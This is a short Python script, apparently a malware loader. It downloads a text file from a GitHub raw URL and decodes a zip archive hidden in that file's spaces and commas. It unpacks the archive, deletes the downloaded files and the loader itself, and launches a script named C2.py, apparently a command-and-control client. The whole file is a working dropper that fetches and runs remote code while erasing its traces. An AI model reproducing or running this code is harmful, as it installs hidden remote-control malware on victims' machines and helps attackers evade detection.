import os, shutil
import random
import urllib.request
with urllib.request.urlopen('https://raw.githubusercontent.com/glyme6139/glyme6139/refs/heads/test/pack.txt') as f, open("pack.txt","w") as o:
    o.write(f.read().decode('utf-8'))




def decode(bits, encoding='utf-8', errors='surrogatepass'):
    n = int(bits.replace(" ","0").replace("\t","1"), 2)
    return n.to_bytes((n.bit_length() + 7) // 8, 'big') or '\0'
    
def recover_file(input) :
    d = ""
    with open(input,"r") as f :
        for s in f.readlines() :
            d += "".join(i for i in s if i in [" ",","])
    return decode(d.replace(",","\t"))

with open("client.zip","wb") as o:
    o.write(recover_file("pack.txt"))

shutil.unpack_archive("client.zip","Client")
os.remove("pack.txt")
os.remove("client.zip")
os.remove("loader.py")
os.system("cd Client && start py C2.py")